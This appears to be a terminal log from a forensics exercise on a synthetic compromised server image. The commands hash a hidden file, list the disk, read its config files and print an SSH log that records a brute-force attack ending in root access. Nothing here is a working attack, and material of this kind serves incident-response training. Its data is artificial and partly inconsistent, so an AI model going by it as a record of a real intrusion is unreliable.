+00000040  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000050  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000060  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000070  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000080  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000090  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000000a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000000b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000000c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000000d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000000e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000000f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000100  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000110  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+00000120  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+00000130  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+00000140  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+00000150  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+00000160  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+00000170  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+00000180  0b 30 55 7a 1f 44 69 0e 33 58 7d 22 47 6c 11 36
+00000190  5b 00 25 4a 6f 14 39 5e 03 28 4d 72 17 3c 61 06
+000001a0  2b 50 75 1a 3f 64 09 2e 53 78 1d 42 67 0c 31 56
+000001b0  7b 20 45 6a 0f 34 59 7e 23 48 6d 12 37 5c 01 26
+000001c0  4b 70 15 3a 5f 04 29 4e 73 18 3d 62 07 2c 51 76
+000001d0  1b 40 65 0a 2f 54 79 1e 43 68 0d 32 57 7c 21 46
+000001e0  6b 10 35 5a 7f 24 49 6e 13 38 5d 02 27 4c 71 16
+000001f0  3b 60 05 2a 4f 74 19 3e 63 08 2d 52 77 1c 41 66
+[?2004hroot@58bb37a3cf48:/app# sha256sum /disk/tmp/.X11-unix/.xorg
+[?2004l52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253  /disk/tmp/.X11-unix/.xorg
+[?2004hroot@58bb37a3cf48:/app# find /disk -ls
+[?2004l  4980807      4 dr-xr-xr-x   7 root     root         4096 Aug 16 14:39 /disk
+  4980808      4 dr-xr-xr-x   5 502      staff        4096 Aug 16 14:28 /disk/etc
+  4980816      4 -r--r--r--   1 502      staff         307 Aug 16 14:28 /disk/etc/passwd
+  4980814      4 -r--r--r--   1 502      staff          81 Aug 16 14:28 /disk/etc/my.cnf
+  4980819      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/etc/ssh
+  4980820      4 -r--r--r--   1 502      staff         226 Aug 16 14:28 /disk/etc/ssh/sshd_config
+  4980810      4 -r--r--r--   1 502      staff          63 Aug 16 14:28 /disk/etc/fstab
+  4980809      4 -r--r--r--   1 502      staff          99 Aug 16 14:28 /disk/etc/crontab
+  4980813      4 -r--r--r--   1 502      staff          44 Aug 16 14:28 /disk/etc/hosts
+  4980811      4 -r--r--r--   1 502      staff          62 Aug 16 14:28 /disk/etc/group
+  4980821      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/etc/sudoers.d
+  4980822      4 -r--r--r--   1 502      staff          69 Aug 16 14:28 /disk/etc/sudoers.d/devops
+  4980812      4 -r--r--r--   1 502      staff          12 Aug 16 14:28 /disk/etc/hostname
+  4980823      4 dr-xr-xr-x   3 502      staff        4096 Aug 16 14:28 /disk/etc/systemd
+  4980825      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/etc/systemd/system
+  4980826      4 -r--r--r--   1 502      staff         169 Aug 16 14:28 /disk/etc/systemd/system/system-update-helper.service
+  4980815      4 -r--r--r--   1 502      staff          55 Aug 16 14:28 /disk/etc/os-release
+  4980835      4 dr-xr-xr-x   5 502      staff        4096 Aug 16 14:28 /disk/var
+  4980849      4 dr-xr-xr-x   3 502      staff        4096 Aug 16 14:28 /disk/var/spool
+  4980850      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/var/spool/cron
+  4980851      4 -r--r--r--   1 502      staff         317 Aug 16 14:28 /disk/var/spool/cron/root
+  4980842      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:29 /disk/var/log
+  4980844     40 -r--r--r--   1 502      staff       38142 Aug 16 14:28 /disk/var/log/messages
+  4980845     52 -r--r--r--   1 502      staff       50870 Aug 16 14:29 /disk/var/log/secure
+  4980846      4 -r--r--r--   1 502      staff        2479 Aug 16 14:29 /disk/var/log/secure.1.gz
+  4980848      4 -r--r--r--   1 502      staff        1815 Aug 16 14:28 /disk/var/log/wtmp.csv
+  4980843     16 -r--r--r--   1 502      staff       15300 Aug 16 14:28 /disk/var/log/kern.log
+  4980836      4 dr-xr-xr-x   4 502      staff        4096 Aug 16 14:29 /disk/var/lib
+  4980840      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/var/lib/dpkg
+  4980841      8 -r--r--r--   1 502      staff        4849 Aug 16 14:28 /disk/var/lib/dpkg/status.summary
+  4980838      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:29 /disk/var/lib/.cache
+  4980839      4 -r--r--r--   1 502      staff         410 Aug 16 14:29 /disk/var/lib/.cache/.wiped.bin
+  4980827      4 dr-xr-xr-x   3 502      staff        4096 Aug 16 14:28 /disk/home
+  4980828      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/home/devops
+  4980829      4 -r--r--r--   1 502      staff         219 Aug 16 14:28 /disk/home/devops/.bash_history
+  4980832      4 dr-xr-xr-x   3 502      staff        4096 Aug 16 14:28 /disk/tmp
+  4980833      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/tmp/.X11-unix
+  4980834      4 -r--r--r--   1 502      staff        2378 Aug 16 14:28 /disk/tmp/.X11-unix/.xorg
+  4980830      4 dr-xr-xr-x   2 502      staff        4096 Aug 16 14:28 /disk/root
+  4980831      4 -r--r--r--   1 502      staff          84 Aug 16 14:28 /disk/root/.bashrc
+[?2004hroot@58bb37a3cf48:/app# cat /disk/etc/fstab /disk/etc/hosts /disk/etc/group /disk/etc/hostname /disk/etc/os-release /disk/var/lib/dpkg/status.summary
+[?2004l/dev/sda1 / ext4 defaults 0 1
+/dev/sda2 /var ext4 defaults 0 2
+127.0.0.1 localhost
+10.10.105.1 ssh-prod-01
+root:x:0:
+sudo:x:27:devops
+www-data:x:33:
+docker:x:998:devops
+ssh-prod-01
+PRETTY_NAME="ssh-miner Linux"
+ID=centos
+VERSION_ID="9"
+Package: pkg0
+Status: install ok installed
+Version: 1.9.4
+
+Package: pkg1
+Status: install ok installed
+Version: 1.6.13
+
+Package: pkg2
+Status: install ok installed
+Version: 1.8.17
+
+Package: pkg3
+Status: install ok installed
+Version: 1.0.5
+
+Package: pkg4
+Status: install ok installed
+Version: 1.9.8
+
+Package: pkg5
+Status: install ok installed
+Version: 1.4.1
+
+Package: pkg6
+Status: install ok installed
+Version: 1.3.25
+
+Package: pkg7
+Status: install ok installed
+Version: 1.1.2
+
+Package: pkg8
+Status: install ok installed
+Version: 1.6.18
+
+Package: pkg9
+Status: install ok installed
+Version: 1.6.29
+
+Package: pkg10
+Status: install ok installed
+Version: 1.3.26
+
+Package: pkg11
+Status: install ok installed
+Version: 1.0.26
+
+Package: pkg12
+Status: install ok installed
+Version: 1.6.24
+
+Package: pkg13
+Status: install ok installed
+Version: 1.7.14
+
+Package: pkg14
+Status: install ok installed
+Version: 1.9.9
+
+Package: pkg15
+Status: install ok installed
+Version: 1.6.25
+
+Package: pkg16
+Status: install ok installed
+Version: 1.7.8
+
+Package: pkg17
+Status: install ok installed
+Version: 1.0.1
+
+Package: pkg18
+Status: install ok installed
+Version: 1.4.5
+
+Package: pkg19
+Status: install ok installed
+Version: 1.8.14
+
+Package: pkg20
+Status: install ok installed
+Version: 1.6.5
+
+Package: pkg21
+Status: install ok installed
+Version: 1.5.10
+
+Package: pkg22
+Status: install ok installed
+Version: 1.7.0
+
+Package: pkg23
+Status: install ok installed
+Version: 1.7.19
+
+Package: pkg24
+Status: install ok installed
+Version: 1.1.12
+
+Package: pkg25
+Status: install ok installed
+Version: 1.5.14
+
+Package: pkg26
+Status: install ok installed
+Version: 1.6.30
+
+Package: pkg27
+Status: install ok installed
+Version: 1.3.25
+
+Package: pkg28
+Status: install ok installed
+Version: 1.1.12
+
+Package: pkg29
+Status: install ok installed
+Version: 1.1.3
+
+Package: pkg30
+Status: install ok installed
+Version: 1.9.28
+
+Package: pkg31
+Status: install ok installed
+Version: 1.0.12
+
+Package: pkg32
+Status: install ok installed
+Version: 1.0.17
+
+Package: pkg33
+Status: install ok installed
+Version: 1.7.24
+
+Package: pkg34
+Status: install ok installed
+Version: 1.4.29
+
+Package: pkg35
+Status: install ok installed
+Version: 1.0.25
+
+Package: pkg36
+Status: install ok installed
+Version: 1.1.7
+
+Package: pkg37
+Status: install ok installed
+Version: 1.2.28
+
+Package: pkg38
+Status: install ok installed
+Version: 1.7.29
+
+Package: pkg39
+Status: install ok installed
+Version: 1.4.23
+
+Package: pkg40
+Status: install ok installed
+Version: 1.9.28
+
+Package: pkg41
+Status: install ok installed
+Version: 1.0.27
+
+Package: pkg42
+Status: install ok installed
+Version: 1.0.19
+
+Package: pkg43
+Status: install ok installed
+Version: 1.0.21
+
+Package: pkg44
+Status: install ok installed
+Version: 1.2.16
+
+Package: pkg45
+Status: install ok installed
+Version: 1.6.3
+
+Package: pkg46
+Status: install ok installed
+Version: 1.1.28
+
+Package: pkg47
+Status: install ok installed
+Version: 1.4.10
+
+Package: pkg48
+Status: install ok installed
+Version: 1.5.30
+
+Package: pkg49
+Status: install ok installed
+Version: 1.9.10
+
+Package: pkg50
+Status: install ok installed
+Version: 1.3.24
+
+Package: pkg51
+Status: install ok installed
+Version: 1.2.10
+
+Package: pkg52
+Status: install ok installed
+Version: 1.5.6
+
+Package: pkg53
+Status: install ok installed
+Version: 1.2.30
+
+Package: pkg54
+Status: install ok installed
+Version: 1.3.23
+
+Package: pkg55
+Status: install ok installed
+Version: 1.1.1
+
+Package: pkg56
+Status: install ok installed
+Version: 1.2.13
+
+Package: pkg57
+Status: install ok installed
+Version: 1.2.18
+
+Package: pkg58
+Status: install ok installed
+Version: 1.3.10
+
+Package: pkg59
+Status: install ok installed
+Version: 1.0.14
+
+Package: pkg60
+Status: install ok installed
+Version: 1.5.12
+
+Package: pkg61
+Status: install ok installed
+Version: 1.7.18
+
+Package: pkg62
+Status: install ok installed
+Version: 1.4.14
+
+Package: pkg63
+Status: install ok installed
+Version: 1.7.28
+
+Package: pkg64
+Status: install ok installed
+Version: 1.0.12
+
+Package: pkg65
+Status: install ok installed
+Version: 1.5.12
+
+Package: pkg66
+Status: install ok installed
+Version: 1.7.28
+
+Package: pkg67
+Status: install ok installed
+Version: 1.9.8
+
+Package: pkg68
+Status: install ok installed
+Version: 1.4.11
+
+Package: pkg69
+Status: install ok installed
+Version: 1.8.14
+
+Package: pkg70
+Status: install ok installed
+Version: 1.1.2
+
+Package: pkg71
+Status: install ok installed
+Version: 1.7.29
+
+Package: pkg72
+Status: install ok installed
+Version: 1.2.8
+
+Package: pkg73
+Status: install ok installed
+Version: 1.5.11
+
+Package: pkg74
+Status: install ok installed
+Version: 1.9.26
+
+Package: pkg75
+Status: install ok installed
+Version: 1.8.3
+
+Package: pkg76
+Status: install ok installed
+Version: 1.6.29
+
+Package: pkg77
+Status: install ok installed
+Version: 1.5.9
+
+Package: pkg78
+Status: install ok installed
+Version: 1.3.16
+
+Package: pkg79
+Status: install ok installed
+Version: 1.6.18
+
+[?2004hroot@58bb37a3cf48:/app# zcat /disk/var/log/secure.1.gz
+[?2004lAug 15 00:33:39 ssh-prod-01 sshd[4545]: Accepted publickey for devops from 10.10.105.137 port 50204 ssh2: RSA SHA256:546395ca
+Aug 15 00:34:19 ssh-prod-01 sshd[2688]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:34:26 ssh-prod-01 sshd[3228]: pam_unix(sudo:session): session opened for user root by devops(uid=1004)
+Aug 15 00:34:54 ssh-prod-01 sshd[8036]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1001)
+Aug 15 00:35:14 ssh-prod-01 sshd[8335]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:35:18 ssh-prod-01 sshd[5198]: Accepted publickey for webadmin from 10.10.105.66 port 44912 ssh2: RSA SHA256:3a7b256f
+Aug 15 00:35:22 ssh-prod-01 sshd[7857]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:35:53 ssh-prod-01 sshd[3429]: Received disconnect from 10.10.105.218 port 42048:11: disconnected by user
+Aug 15 00:35:59 ssh-prod-01 sshd[1680]: Accepted publickey for svc-backup from 10.10.105.65 port 43073 ssh2: RSA SHA256:1e77e177
+Aug 15 00:36:18 ssh-prod-01 sshd[4206]: Accepted publickey for root from 10.10.105.117 port 63715 ssh2: RSA SHA256:5d9e5dbd
+Aug 15 00:36:29 ssh-prod-01 sshd[5144]: Received disconnect from 10.10.105.86 port 42673:11: disconnected by user
+Aug 15 00:37:13 ssh-prod-01 sshd[8129]: Accepted publickey for svc-backup from 10.10.105.191 port 42828 ssh2: RSA SHA256:2b2f20b8
+Aug 15 00:37:40 ssh-prod-01 sshd[2689]: pam_unix(sudo:session): session opened for user root by postgres(uid=1003)
+Aug 15 00:38:17 ssh-prod-01 sshd[6985]: pam_unix(sudo:session): session opened for user root by devops(uid=1005)
+Aug 15 00:38:47 ssh-prod-01 sshd[1673]: Accepted publickey for svc-backup from 10.10.105.189 port 63042 ssh2: RSA SHA256:6de7ec33
+Aug 15 00:39:26 ssh-prod-01 sshd[3078]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1000)
+Aug 15 00:39:59 ssh-prod-01 sshd[8618]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:40:18 ssh-prod-01 sshd[1224]: Received disconnect from 10.10.105.186 port 45317:11: disconnected by user
+Aug 15 00:40:43 ssh-prod-01 sshd[5870]: Accepted publickey for svc-backup from 10.10.105.79 port 50323 ssh2: RSA SHA256:0e019611
+Aug 15 00:41:17 ssh-prod-01 sshd[8159]: Accepted publickey for devops from 10.10.105.86 port 59817 ssh2: RSA SHA256:5c4ae071
+Aug 15 00:41:50 ssh-prod-01 sshd[2851]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1000)
+Aug 15 00:42:30 ssh-prod-01 sshd[8043]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1000)
+Aug 15 00:43:15 ssh-prod-01 sshd[5404]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:43:34 ssh-prod-01 sshd[5095]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:43:55 ssh-prod-01 sshd[8801]: Accepted publickey for jenkins from 10.10.105.205 port 59277 ssh2: RSA SHA256:409e8bd5
+Aug 15 00:44:13 ssh-prod-01 sshd[8228]: Accepted publickey for root from 10.10.105.48 port 46919 ssh2: RSA SHA256:392ab67c
+Aug 15 00:44:27 ssh-prod-01 sshd[7936]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:44:47 ssh-prod-01 sshd[4265]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 00:45:16 ssh-prod-01 sshd[1886]: Received disconnect from 10.10.105.108 port 41083:11: disconnected by user
+Aug 15 00:45:45 ssh-prod-01 sshd[1625]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:46:12 ssh-prod-01 sshd[8609]: pam_unix(sudo:session): session opened for user root by devops(uid=1002)
+Aug 15 00:46:29 ssh-prod-01 sshd[5840]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 00:46:55 ssh-prod-01 sshd[3220]: Received disconnect from 10.10.105.205 port 60058:11: disconnected by user
+Aug 15 00:47:39 ssh-prod-01 sshd[1706]: Received disconnect from 10.10.105.46 port 58633:11: disconnected by user
+Aug 15 00:48:01 ssh-prod-01 sshd[2887]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 15 00:48:06 ssh-prod-01 sshd[8154]: Received disconnect from 10.10.105.70 port 55799:11: disconnected by user
+Aug 15 00:48:12 ssh-prod-01 sshd[6387]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:48:23 ssh-prod-01 sshd[1047]: Received disconnect from 10.10.105.8 port 54980:11: disconnected by user
+Aug 15 00:48:54 ssh-prod-01 sshd[6088]: pam_unix(sudo:session): session opened for user root by postgres(uid=1005)
+Aug 15 00:48:56 ssh-prod-01 sshd[2422]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 00:49:06 ssh-prod-01 sshd[6707]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:49:25 ssh-prod-01 sshd[7707]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 00:50:04 ssh-prod-01 sshd[8394]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 00:53:21 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 45534 ssh2
+Aug 15 00:53:24 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 40081 ssh2
+Aug 15 00:53:28 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 55280 ssh2
+Aug 15 00:53:30 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 62367 ssh2
+Aug 15 00:53:31 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 61992 ssh2
+Aug 15 00:53:35 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 45572 ssh2
+Aug 15 00:53:37 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 61177 ssh2
+Aug 15 00:53:38 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 58899 ssh2
+Aug 15 00:53:39 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 60851 ssh2
+Aug 15 00:53:41 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 56537 ssh2
+Aug 15 00:53:42 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 46171 ssh2
+Aug 15 00:53:45 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 47715 ssh2
+Aug 15 00:53:48 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 46062 ssh2
+Aug 15 00:53:49 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 63394 ssh2
+Aug 15 00:53:52 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 61152 ssh2
+Aug 15 00:53:55 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 60269 ssh2
+Aug 15 00:53:58 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 57379 ssh2
+Aug 15 00:54:00 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 47277 ssh2
+Aug 15 00:54:02 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 53758 ssh2
+Aug 15 00:54:04 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 47920 ssh2
+Aug 15 00:54:07 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 53971 ssh2
+Aug 15 00:54:08 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 51403 ssh2
+Aug 15 00:54:10 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 51587 ssh2
+Aug 15 00:54:13 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 61315 ssh2
+Aug 15 00:54:17 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 49528 ssh2
+Aug 15 00:54:19 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 48874 ssh2
+Aug 15 00:54:21 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 56715 ssh2
+Aug 15 00:54:24 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 54363 ssh2
+Aug 15 00:54:25 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 59542 ssh2
+Aug 15 00:54:27 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 47703 ssh2
+Aug 15 00:54:30 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 56801 ssh2
+Aug 15 00:54:34 ssh-prod-01 sshd[1201]: Failed password for admin from 198.51.100.78 port 44850 ssh2
+Aug 15 00:54:37 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 45318 ssh2
+Aug 15 00:54:41 ssh-prod-01 sshd[1201]: Failed password for test from 198.51.100.78 port 44223 ssh2
+Aug 15 00:54:42 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 57335 ssh2
+Aug 15 00:54:45 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 63649 ssh2
+Aug 15 00:54:48 ssh-prod-01 sshd[1201]: Failed password for postgres from 198.51.100.78 port 41378 ssh2
+Aug 15 00:54:52 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 43012 ssh2
+Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2
+Aug 15 00:50:28 ssh-prod-01 sshd[8650]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1002)
+Aug 15 00:50:39 ssh-prod-01 sshd[8599]: Received disconnect from 10.10.105.118 port 57155:11: disconnected by user
+Aug 15 00:50:45 ssh-prod-01 sshd[1434]: Received disconnect from 10.10.105.118 port 43950:11: disconnected by user
+Aug 15 00:51:12 ssh-prod-01 sshd[2500]: Accepted publickey for postgres from 10.10.105.21 port 60855 ssh2: RSA SHA256:39f3bb8d
+Aug 15 00:51:26 ssh-prod-01 sshd[8043]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 00:52:03 ssh-prod-01 sshd[8471]: Accepted publickey for postgres from 10.10.105.220 port 53292 ssh2: RSA SHA256:048a2733
+Aug 15 00:52:35 ssh-prod-01 sshd[8591]: Received disconnect from 10.10.105.138 port 49987:11: disconnected by user
+Aug 15 00:53:08 ssh-prod-01 sshd[7321]: Accepted publickey for svc-backup from 10.10.105.55 port 51033 ssh2: RSA SHA256:2b1ba5be
+Aug 15 00:53:52 ssh-prod-01 sshd[1561]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 00:54:19 ssh-prod-01 sshd[1480]: Received disconnect from 10.10.105.210 port 47002:11: disconnected by user
+Aug 15 00:54:54 ssh-prod-01 sshd[6385]: pam_unix(sudo:session): session opened for user root by postgres(uid=1004)
+Aug 15 00:55:22 ssh-prod-01 sshd[7819]: Received disconnect from 10.10.105.87 port 61976:11: disconnected by user
+Aug 15 00:56:06 ssh-prod-01 sshd[1248]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:56:46 ssh-prod-01 sshd[6457]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 00:57:23 ssh-prod-01 sshd[5977]: Received disconnect from 10.10.105.140 port 56294:11: disconnected by user
+Aug 15 00:57:39 ssh-prod-01 sshd[3314]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 00:57:40 ssh-prod-01 sshd[8768]: Accepted publickey for svc-backup from 10.10.105.62 port 44339 ssh2: RSA SHA256:2f9f5d8e
+Aug 15 00:58:02 ssh-prod-01 sshd[1447]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:58:18 ssh-prod-01 sshd[3296]: pam_unix(sshd:session): session opened for user jenkins by (uid=0)
+Aug 15 00:58:53 ssh-prod-01 sshd[2140]: Received disconnect from 10.10.105.51 port 55506:11: disconnected by user
+Aug 15 00:59:34 ssh-prod-01 sshd[1273]: Accepted publickey for jenkins from 10.10.105.42 port 49094 ssh2: RSA SHA256:5ca445c9
+Aug 15 01:00:08 ssh-prod-01 sshd[5060]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:00:45 ssh-prod-01 sshd[4552]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 15 01:01:24 ssh-prod-01 sshd[4754]: Received disconnect from 10.10.105.113 port 55130:11: disconnected by user
+Aug 15 01:01:35 ssh-prod-01 sshd[4695]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:01:52 ssh-prod-01 sshd[6608]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 01:02:04 ssh-prod-01 sshd[8158]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:02:18 ssh-prod-01 sshd[8746]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:02:28 ssh-prod-01 sshd[7908]: Received disconnect from 10.10.105.8 port 40267:11: disconnected by user
+Aug 15 01:02:32 ssh-prod-01 sshd[8526]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 01:02:57 ssh-prod-01 sshd[7033]: Received disconnect from 10.10.105.100 port 57019:11: disconnected by user
+Aug 15 01:03:08 ssh-prod-01 sshd[4401]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Aug 15 01:03:35 ssh-prod-01 sshd[8839]: Accepted publickey for devops from 10.10.105.128 port 51428 ssh2: RSA SHA256:2d187129
+Aug 15 01:03:43 ssh-prod-01 sshd[6771]: Received disconnect from 10.10.105.4 port 45703:11: disconnected by user
+Aug 15 01:04:24 ssh-prod-01 sshd[7222]: pam_unix(sudo:session): session opened for user root by root(uid=1005)
+Aug 15 01:05:05 ssh-prod-01 sshd[7932]: pam_unix(sudo:session): session opened for user root by root(uid=1003)
+Aug 15 01:05:36 ssh-prod-01 sshd[5474]: Accepted publickey for devops from 10.10.105.2 port 50607 ssh2: RSA SHA256:107832f8
+Aug 15 01:06:17 ssh-prod-01 sshd[5939]: Received disconnect from 10.10.105.146 port 45426:11: disconnected by user
+Aug 15 01:06:52 ssh-prod-01 sshd[8874]: Accepted publickey for webadmin from 10.10.105.248 port 49763 ssh2: RSA SHA256:46a0bd46
+Aug 15 01:07:23 ssh-prod-01 sshd[7542]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 01:08:00 ssh-prod-01 sshd[7164]: Received disconnect from 10.10.105.137 port 49021:11: disconnected by user
+Aug 15 01:08:16 ssh-prod-01 sshd[1008]: Received disconnect from 10.10.105.44 port 56493:11: disconnected by user
+Aug 15 01:08:51 ssh-prod-01 sshd[2117]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1000)
+Aug 15 01:09:08 ssh-prod-01 sshd[5383]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:09:11 ssh-prod-01 sshd[3982]: pam_unix(sshd:session): session opened for user svc-backup by (uid=0)
+Aug 15 01:09:20 ssh-prod-01 sshd[7323]: pam_unix(sudo:session): session opened for user root by svc-backup(uid=1005)
+Aug 15 01:09:36 ssh-prod-01 sshd[2142]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 01:09:57 ssh-prod-01 sshd[1660]: pam_unix(sudo:session): session opened for user root by webadmin(uid=1001)
+Aug 15 01:10:17 ssh-prod-01 sshd[4989]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Aug 15 01:10:47 ssh-prod-01 sshd[4973]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 01:11:15 ssh-prod-01 sshd[3834]: Accepted publickey for root from 10.10.105.242 port 47648 ssh2: RSA SHA256:3cf23da8
+Aug 15 01:11:29 ssh-prod-01 sshd[8322]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1004)
+Aug 15 01:11:30 ssh-prod-01 sshd[3498]: Received disconnect from 10.10.105.184 port 52535:11: disconnected by user
+Aug 15 01:11:54 ssh-prod-01 sshd[4832]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 15 01:12:07 ssh-prod-01 sshd[2246]: pam_unix(sshd:session): session opened for user webadmin by (uid=0)
+Aug 15 01:12:41 ssh-prod-01 sshd[6599]: Received disconnect from 10.10.105.41 port 53254:11: disconnected by user
+Aug 15 01:13:20 ssh-prod-01 sshd[8258]: pam_unix(sudo:session): session opened for user root by jenkins(uid=1001)
+Aug 15 01:13:58 ssh-prod-01 sshd[6841]: Accepted publickey for devops from 10.10.105.62 port 63973 ssh2: RSA SHA256:2e2a110d
+Aug 15 01:14:35 ssh-prod-01 sshd[3684]: Accepted publickey for svc-backup from 10.10.105.131 port 58888 ssh2: RSA SHA256:09e877d9
+Aug 15 01:14:57 ssh-prod-01 sshd[1151]: Accepted publickey for devops from 10.10.105.218 port 55262 ssh2: RSA SHA256:30ae493b
+Aug 15 01:15:20 ssh-prod-01 sshd[1281]: Accepted publickey for root from 10.10.105.188 port 58852 ssh2: RSA SHA256:469c4126
